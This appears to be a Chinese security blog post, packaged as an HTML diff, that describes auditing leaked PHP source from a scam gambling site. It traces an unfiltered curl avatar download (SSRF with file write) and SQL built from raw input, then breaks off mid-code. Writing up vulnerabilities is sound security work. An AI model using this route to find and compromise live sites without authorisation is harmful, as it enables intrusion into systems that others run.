@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple_touch_icon.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/apple_touch_icon.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"hide","padding":18,"offset":12,"onmobile":false,"dimmer":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="起因">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【实战】杀猪盘SSRF到getshell">
+<meta property="og:url" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/index.html">
+<meta property="og:site_name" content="行云">
+<meta property="og:description" content="起因">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/30e4f0c5-8f62-4637-b0ee-716331b0da71.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/f6487442-fb70-4c3a-a487-72d93153629d.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/e3d6f208-f6d1-4920-b63a-c6719c183e47.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/255cf2ea-9290-4c99-ae2e-9cedcd975279.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/efe1bfa4-c495-4722-b48b-db7fbaf1736d.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/5b81b44e-2da3-4b3c-a18d-f5f9a27bd570.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/daf98084-0a93-43ff-a051-3b0b742b5b50.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4a615c19-78d3-451c-a84b-14b5478809d3.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/299328e6-eff4-4609-bbb0-7dbf3ce14957.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/702c41bf-326d-4cae-87c9-9c754d7a7a94.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/de188928-46c4-403c-8459-33939109b689.jpg">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4ad82c3b-ae67-4f98-a57d-86b06fcb3844.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/d24d6b05-0ee0-47b2-a04c-271da2f92442.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4263f1e3-9302-49a2-8ac4-d92d52952d06.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/eedf9265-be6c-4159-b6ec-678df695f24e.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4cb8b07e-bec8-48f4-9109-b111984556f7.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/b4f232d9-7cc2-476c-afa7-b0503c908bff.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/2a29dbc9-2a1e-4e89-b1b5-94ffb5c455e5.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/2137dc19-a71c-445b-94fc-4cfa1a8fa0ac.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/69580fe8-97af-4d1e-945e-28cb03f5251d.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/08e5c830-c06c-4225-91d5-5012bd597ce0.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/9382fedd-cfee-418f-8409-0ec04f38323f.png">
+<meta property="og:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/4fc0bcae-df90-4b1d-936f-9e2808097835.png">
+<meta property="article:published_time" content="2021-03-12T01:28:14.000Z">
+<meta property="article:modified_time" content="2022-01-08T09:42:19.060Z">
+<meta property="article:author" content="行云">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/30e4f0c5-8f62-4637-b0ee-716331b0da71.png">
+
+<link rel="canonical" href="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【实战】杀猪盘SSRF到getshell | 行云</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">行云</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fas fa-users fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="行云">
+      <meta itemprop="description" content="千里江山 任我飞渡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="行云">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【实战】杀猪盘SSRF到getshell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-12 09:28:14" itemprop="dateCreated datePublished" datetime="2021-03-12T09:28:14+08:00">2021-03-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%9E%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">实战</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>前段时间拿到一个杀猪盘，一直很忙没有看，最近闲下来就看了一下，没发现什么明显的漏洞，就在<code>Fofa</code>上通过特征搜了一批同类型的站扫源码备份，运气很好，扫到一份</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>本来找到一处任意上传，但是在目标上面已经被删除，只能继续看代码<br>在全局搜索<code>curl</code>的时候发现在<code>\lib\controller\api\user.php</code>文件的<code>_downloadAvatarFromThird</code>私有方法里面有定义<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/30e4f0c5-8f62-4637-b0ee-716331b0da71.png" alt="30e4f0c5-8f62-4637-b0ee-716331b0da71.png"></p>
+<ol>
+<li>在279到282行没有任何过滤直接把传进来的<code>$thirdAvatarUrl</code>使用<code>curl</code>进行请求并把返回结果存储在<code>$imageData</code></li>
+<li>在284行通过<code>getAvatarFilename</code>方法获取到一个基于以微秒计的当前时间然后拼接<code>.jpg</code>的文件名<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/f6487442-fb70-4c3a-a487-72d93153629d.png" alt="f6487442-fb70-4c3a-a487-72d93153629d.png"></li>
+<li>在285行通过<code>getAvatarUrl</code>方法获取到一个本地存储的绝对路径<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/e3d6f208-f6d1-4920-b63a-c6719c183e47.png" alt="e3d6f208-f6d1-4920-b63a-c6719c183e47.png"><blockquote>
+<p><code>S_ROOT</code>在<code>/index.php</code>里被定义为当前网站根目录的绝对路径<br><img src="/2021/03/12/%E5%AE%9E%E6%88%98%E6%9D%80%E7%8C%AA%E7%9B%98SSRF%E5%88%B0getshell/255cf2ea-9290-4c99-ae2e-9cedcd975279.png" alt="255cf2ea-9290-4c99-ae2e-9cedcd975279.png"></p>
+</blockquote>
+</li>
+<li>在294行把结果写入到第285行获取到的文件名里</li>
+</ol>
+<p>现在知道了<code>_downloadAvatarFromThird</code>方法有明显的<code>SSRF</code>漏洞并把结果写入到一个文件里面之后，只需要找到哪里调用的这个方法，然后看看<code>$thirdAvatarUrl</code>变量是否可控<br>通过搜索，在第139行的公开方法<code>thirdPartyLogin</code>里面调用了<code>_downloadAvatarFromThird</code>方法，并且<code>$thirdAvatarUrl</code>也是可控的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 第三方登录 qq 微信</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> POST  /index.php?m = api&amp;c = user&amp;a = registerMachine</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> flag string 入口标示</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> code string 机身码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> json</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">thirdPartyLogin</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_start&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">$this</span>-&gt;checkInput(<span class="variable">$_REQUEST</span>, <span class="keyword">array</span>(<span class="string">&#x27;openid&#x27;</span>,<span class="string">&#x27;nickname&#x27;</span>,<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;code&#x27;</span>), <span class="string">&#x27;all&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_check_params_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$openid</span> = trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;openid&#x27;</span>]);</span><br><span class="line"> <span class="variable">$nickname</span> = trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;nickname&#x27;</span>]);</span><br><span class="line"> <span class="variable">$avatar</span> = trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;avatar&#x27;</span>]);</span><br><span class="line"> <span class="variable">$type</span> = trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line"> <span class="variable">$flag</span> = trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line"> <span class="variable">$code</span> = trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"> <span class="keyword">if</span>(!in_array(<span class="variable">$type</span>,<span class="keyword">array</span>(<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)))&#123;</span><br><span class="line">  ErrorCode::errorResponse(ErrorCode::DB_ERROR);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//获取IP地址及ip归属地</span></span><br><span class="line"> <span class="variable">$ipData</span> = getIp();</span><br><span class="line"> log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_getip_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT user_id FROM `un_user_third` WHERE `openid` = &#x27;<span class="subst">&#123;$openid&#125;</span>&#x27; AND `type` = &#x27;<span class="subst">&#123;$type&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"> <span class="variable">$res</span> = O(<span class="string">&#x27;model&#x27;</span>)-&gt;db-&gt;getOne(<span class="variable">$sql</span>);</span><br><span class="line"> log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_checkOpenidExists_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$res</span>[<span class="string">&#x27;user_id&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$username</span> = <span class="keyword">$this</span>-&gt;getUsername(<span class="number">6</span>,<span class="number">10</span>);</span><br><span class="line">  <span class="comment">//添加用户</span></span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">   <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="variable">$nickname</span>,</span><br><span class="line">   <span class="string">&#x27;regtime&#x27;</span> =&gt; SYS_TIME,</span><br><span class="line">   <span class="string">&#x27;birthday&#x27;</span> =&gt; SYS_TIME,</span><br><span class="line">   <span class="string">&#x27;regip&#x27;</span> =&gt; <span class="variable">$ipData</span>[<span class="string">&#x27;ip&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;reg_ip_attribution&#x27;</span> =&gt; <span class="variable">$ipData</span>[<span class="string">&#x27;attribution&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;loginip&#x27;</span> =&gt; <span class="variable">$ipData</span>[<span class="string">&#x27;ip&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;login_ip_attribution&#x27;</span> =&gt; <span class="variable">$ipData</span>[<span class="string">&#x27;attribution&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;logintime&#x27;</span> =&gt; SYS_TIME,</span><br><span class="line">   <span class="string">&#x27;logintimes&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">   <span class="string">&#x27;reg_type&#x27;</span> =&gt; <span class="variable">$type</span>,</span><br><span class="line">   <span class="string">&#x27;entrance&#x27;</span> =&gt; <span class="variable">$flag</span>,</span><br><span class="line">   <span class="string">&#x27;layer_id&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;model2-&gt;getDefaultLayer()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$userId</span> = <span class="keyword">$this</span>-&gt;model-&gt;add(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$userId</span>) &#123;</span><br><span class="line">   ErrorCode::errorResponse(ErrorCode::DB_ERROR);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//添加资金账户</span></span><br><span class="line">  <span class="variable">$map</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">   <span class="string">&#x27;money&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">$this</span>-&gt;model2-&gt;add(<span class="variable">$map</span>);</span><br><span class="line"></span><br><span class="line">  O(<span class="string">&#x27;model&#x27;</span>)-&gt;db-&gt;query(<span class="string">&quot;INSERT INTO `un_user_tree` (`user_id`, `pids`, `layer`) VALUES (<span class="subst">&#123;$userId&#125;</span>, &#x27;,&#x27;, 1)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//添加第三方数据表记录</span></span><br><span class="line">  <span class="variable">$sql2</span> = <span class="string">&quot;INSERT INTO `un_user_third` (`user_id`, `openid`, `type`, `addtime`) VALUES (&#x27;<span class="subst">&#123;$userId&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$openid&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$type&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$data[&#x27;regtime&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">  O(<span class="string">&#x27;model&#x27;</span>)-&gt;db-&gt;query(<span class="variable">$sql2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//下载头像</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$avatar</span>))&#123;</span><br><span class="line">   <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;_downloadAvatarFromThird(<span class="variable">$userId</span>, <span class="variable">$avatar</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置登录信息</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;loginLog(<span class="variable">$userId</span>, <span class="variable">$flag</span>, <span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$token</span> = <span class="keyword">$this</span>-&gt;setToken(<span class="variable">$userId</span>,<span class="variable">$code</span>);</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;uid&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">   <span class="string">&#x27;token&#x27;</span> =&gt; <span class="variable">$token</span>,</span><br><span class="line">   <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">   <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="variable">$nickname</span>,</span><br><span class="line">   <span class="string">&#x27;avatar&#x27;</span> =&gt; <span class="variable">$res</span>?<span class="variable">$res</span>:<span class="string">&#x27;/up_files/room/avatar.png&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;state&#x27;</span> =&gt; <span class="number">1</span></span><br><span class="line">  );</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable">$userId</span> = <span class="variable">$res</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT id,username,nickname,avatar,password FROM un_user WHERE id = &#x27;&quot;</span> . <span class="variable">$userId</span> .<span class="string">&quot;&#x27; AND state IN(0,1)&quot;</span>;</span><br><span class="line">  <span class="variable">$userInfo</span> = O(<span class="string">&#x27;model&#x27;</span>)-&gt;db-&gt;getOne(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">  log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_getUserInfo_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$userInfo</span>)) &#123;</span><br><span class="line">   ErrorCode::errorResponse(ErrorCode::PHONE_OR_PWD_INVALID);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//更新登录信息</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;model-&gt;updateLoginInfo(<span class="variable">$userId</span>);</span><br><span class="line">  log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_updateLogData_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//去掉更新设备，这里更新的设备字段，为注册设备，最后登录设备已记录在 un_user_login_log 表</span></span><br><span class="line">  <span class="comment">// $this-&gt;model-&gt;save(array(&#x27;entrance&#x27; =&gt; $flag), array(&#x27;id&#x27; =&gt; $userId)); //更新用户设备登录类型</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置登录信息</span></span><br><span class="line">  <span class="variable">$token</span> = <span class="keyword">$this</span>-&gt;setToken(<span class="variable">$userId</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_setToken_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">$this</span>-&gt;loginLog(<span class="variable">$userId</span>, <span class="variable">$flag</span>, <span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">  log_to_mysql(runtime(),<span class="string">&#x27;thirdPartyLogin_logLoginData_end&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;uid&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">   <span class="string">&#x27;token&#x27;</span> =&gt; <span class="variable">$token</span>,</span><br><span class="line">   <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$userInfo</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">   <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="keyword">empty</span>(<span 